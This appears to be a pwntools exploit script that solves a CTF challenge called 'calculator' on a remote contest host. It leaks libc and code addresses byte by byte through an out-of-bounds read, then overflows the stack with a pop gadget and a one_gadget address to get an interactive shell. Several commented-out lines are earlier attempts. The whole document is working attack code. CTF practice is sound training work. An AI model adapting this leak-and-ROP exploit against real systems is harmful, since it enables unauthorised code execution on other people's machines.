from pwn import * 
from LibcSearcher import * 
import random
# context.log_level = 'debug' 
# p=process('./calculator')
p=remote('t.ctf.qwq.cc',49588)
elf=ELF('./calculator')
libc=ELF('./libc-2.31.so')
one=0xe3b01
pop_r15=0x00000000000017a2
libc_addr=0
pop_rdi_addr=0
for i in range(8):
    p.recvuntil(b'option:')
    p.sendline(b'1')
    p.recvuntil(b'number: \n')
    p.sendline(str(41+i).encode())
    for j in range(40+i):
        p.sendline(b'0')
    p.sendline(b'+')
    p.recvuntil(b'result is ')
    a=p.recvuntil(b'\n').strip().decode()
    print('a',hex(int(a)))
    libc_addr+=int(a)<<(8*i)
print(hex(libc_addr))
libcbase=libc_addr-libc.sym['printf']-175
one_gadget=libcbase+one
print(hex(libcbase))
pause()
for i in range(8):
    p.recvuntil(b'option:')
    p.sendline(b'1')
    p.recvuntil(b'number: \n')
    p.sendline(str(249+i).encode())
    for j in range(248+i):
        p.sendline(b'0')
    p.sendline(b'+')
    p.recvuntil(b'result is ')
    a=p.recvuntil(b'\n').strip().decode()
    print('a',hex(int(a)))
    pop_rdi_addr+=int(a)<<(8*i)
pop_rdi_addr+=0x4b0
print(hex(pop_rdi_addr))
# libcbase=pro_addr-libc.sym['printf']-175
# print(hex(libcbase))
pause()
p.recvuntil(b'option:')
p.sendline(b'1')
p.recvuntil(b'number: \n')
p.sendline(b'304')
for i in range(264):
    p.sendline(b'5')
# pause()

for i in range(16):
    p.sendline(b'+')
for i in range(8):
    p.sendline(str(int((pop_rdi_addr>>(i*8))&0xff)).encode())
for i in range(8):
    p.sendline(b'0')
for i in range(8):
    p.sendline(str(int((one_gadget>>(i*8))&0xff)).encode())
# p.sendline(b'248')

# p.recvuntil(b'number: \n')

# # p.sendline(b'298')
# p.sendline(b'281')
# for i in range(264):
#     p.sendline(b'5')
# # pause()
# for i in range(15):
#     p.sendline(b'+')
# pause()
# p.sendline(b'+')

# p.sendline(b'248')

# p.recvuntil(b'number: \n')

# # p.sendline(b'298')
# p.sendline(b'283')
# for i in range(264):
#     p.sendline(b'5')
# # pause()
# for i in range(16):
#     p.sendline(b'+')
# pause()
# p.sendline(b'1')
# p.sendline(b'59')
# pause()
# p.sendline(b'15')
p.interactive()
